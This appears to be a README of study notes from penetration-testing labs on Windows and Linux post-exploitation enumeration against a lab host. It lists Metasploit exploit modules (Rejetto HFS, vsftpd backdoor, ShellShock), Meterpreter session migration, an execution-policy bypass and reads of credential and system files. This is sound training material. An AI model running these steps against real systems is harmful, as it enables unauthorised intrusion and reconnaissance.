This comprehensive README summarizes all labs, tools, and commands detailed in the sources for Windows and Linux post-exploitation enumeration.

# Post-Exploitation Enumeration README

This document provides a detailed breakdown of the methodologies, tools, and every command used across the provided post-exploitation labs.

## **Core Tools Overview**
*   **Nmap:** Used for service version detection and port scanning to identify initial entry points.
*   **Searchsploit:** Utilized to find Metasploit modules or standalone exploits for identified services (e.g., Rejetto HFS).
*   **Metasploit Framework (msfconsole):** The primary exploitation and post-exploitation framework.
*   **Meterpreter:** An advanced payload providing extensive post-exploitation commands (e.g., `sysinfo`, `getuid`, `ps`).
*   **JAWS (Just Another Windows Enum Script):** A PowerShell script used to automate the discovery of privilege escalation vectors on Windows.
*   **LinEnum:** A bash script designed to automate local enumeration and privilege escalation discovery on Linux.

---

## **Windows Post-Exploitation Labs**

### **Lab 1: Enumerating System Information**
**Objective:** Identify the OS version, architecture, hostname, and installed hotfixes.
*   **Commands:**
    *   `ping -c 4 demo.ine.local` (Check reachability)
    *   `nmap -sV demo.ine.local` (Service scanning)
    *   `searchsploit rejetto` (Find exploit)
    *   `msfconsole` (Launch framework)
    *   `use exploit/windows/http/rejetto_hfs_exec`
    *   `set RHOSTS demo.ine.local`
    *   `exploit` (Gain Meterpreter session)
    *   `sysinfo` (OS and architecture info)
    *   `shell` (Drop to native CMD shell)
    *   `hostname` (Identify system name)
    *   `systeminfo` (Detailed OS, build, and hotfix list)
    *   `wmic qfe get Caption,Description,HotFixID,InstalledOn` (Detailed patch info)

### **Lab 2: Enumerating Users & Groups**
**Objective:** Determine current user privileges, logged-on users, and local group memberships.
*   **Commands:**
    *   `getuid` (Check current user)
    *   `getprivs` (Check enabled process privileges)
    *   `background` (Background current session)
    *   `use post/windows/gather/enum_logged_on_users`
    *   `set SESSION 1`
    *   `run` (Execute automated user enumeration)
    *   `sessions 1` (Return to session)
    *   `whoami` / `whoami /priv` (Native shell privilege check)
    *   `net users` (List local accounts)
    *   `net user administrator` (Detail specific account)
    *   `net localgroup` (List all local groups)
    *   `net localgroup administrators` (List members of a group)

### **Lab 3: Enumerating Network Information**
**Objective:** Map network interfaces, routing tables, and active connections.
*   **Commands:**
    *   `ipconfig` (Basic interface info)
    *   `ipconfig /all` (Includes MAC addresses and DNS)
    *   `route print` (View IPv4 and IPv6 routing tables)
    *   `arp -a` (Discover other IPs on the local network)
    *   `netstat -ano` (List open ports and associated PIDs)

### **Lab 4: Enumerating Processes and Services**
**Objective:** Monitor running processes, migrate sessions, and identify scheduled tasks.
*   **Commands:**
    *   `ps` (List all processes with PIDs and paths)
    *   `pgrep explorer.exe` (Find PID for a specific process)
    *   `migrate 2252` (Move session to another PID, e.g., explorer.exe)
    *   `net start` (List started services)
    *   `wmic service list brief` (Services with PIDs and states)
    *   `tasklist /SVC` (Map processes to services)
    *   `schtasks /query /fo LIST` (Enumerate scheduled tasks)

### **Lab 5: Automating Windows Local Enumeration**
**Objective:** Use automated scripts and Metasploit modules for rapid data collection.
*   **Metasploit Automated Commands:**
    *   `use exploit/windows/winrm/winrm_script_exec`
    *   `set USERNAME administrator` / `set PASSWORD tinkerbell`
    *   `set FORCE_VBS false`
    *   `use post/windows/gather/win_privs`
    *   `use post/windows/gather/checkvm` (Identify if target is a VM/Container)
    *   `use post/windows/gather/enum_applications` (List installed software)
    *   `use post/windows/gather/enum_computers` (Find other LAN hosts)
    *   `use post/windows/gather/enum_patches` (Automated patch listing)
*   **JAWS Script Commands:**
    *   `mkdir temp`
    *   `upload /root/Desktop/jaws-enum.ps1`
    *   `powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename JAWS-Enum.txt`
    *   `download JAWS-Enum.txt`

---

## **Linux Post-Exploitation Labs**

### **Lab 6: Enumerating System Information**
**Objective:** Identify the Linux distribution, kernel version, and hardware specs.
*   **Commands:**
    *   `nmap -sV demo.ine.local`
    *   `use exploit/unix/ftp/vsftpd_234_backdoor`
    *   `sessions -u 1` (Upgrade shell to Meterpreter)
    *   `sysinfo` (Distribution and architecture)
    *   `/bin/bash -i` (Spawn interactive bash shell)
    *   `hostname`
    *   `cat /etc/issue` / `cat /etc/*release` (Manual distro identification)
    *   `uname -a` (Detailed kernel version)
    *   `lscpu` (CPU hardware info)
    *   `df -h` (Storage, mount points, and capacity)

### **Lab 7: Enumerating Users & Groups**
**Objective:** Identify account details and login history.
*   **Commands:**
    *   `getuid`
    *   `whoami`
    *   `groups root` (Check memberships for root)
    *   `cat /etc/passwd` (List all system accounts)
    *   `groups` (List groups on system)
    *   `who` (Currently logged on users)
    *   `lastlog` (Recent login history)

### **Lab 8: Enumerating Network Information**
**Objective:** Mapping network interfaces, DNS, and local host mappings.
*   **Commands:**
    *   `ifconfig` (Interface and IP list)
    *   `netstat` (Open ports)
    *   `route` (Routing table)
    *   `ip a s` (Native shell interface listing)
    *   `cat /etc/networks` (Configured subnets)
    *   `cat /etc/hosts` (Locally mapped domains)
    *   `cat /etc/resolv.conf` (DNS nameserver addresses)

### **Lab 9: Enumerating Processes and Cron Jobs**
**Objective:** Monitor active tasks and scheduled system jobs.
*   **Commands:**
    *   `ps` (Running processes)
    *   `pgrep vsftpd` (Identify specific service PID)
    *   `ls -al /etc/cron*` (Enumerate all cron job directories/files)

### **Lab 10: Automating Linux Local Enumeration**
**Objective:** Use LinEnum and Metasploit for efficient enumeration.
*   **Metasploit Automated Commands:**
    *   `use exploit/multi/http/apache_mod_cgi_bash_env_exec` (ShellShock)
    *   `set TARGETURI /gettime.cgi`
    *   `use post/linux/gather/enum_configs` (List system configs)
    *   `use post/linux/gather/enum_network` (Automated network mapping)
    *   `use post/linux/gather/enum_system` (Automated distro/kernel info)
*   **LinEnum Script Commands:**
    *   `cd /tmp`
    *   `upload /root/Desktop/LinEnum.sh`
    *   `chmod +x LinEnum.sh`
    *   `./LinEnum.sh`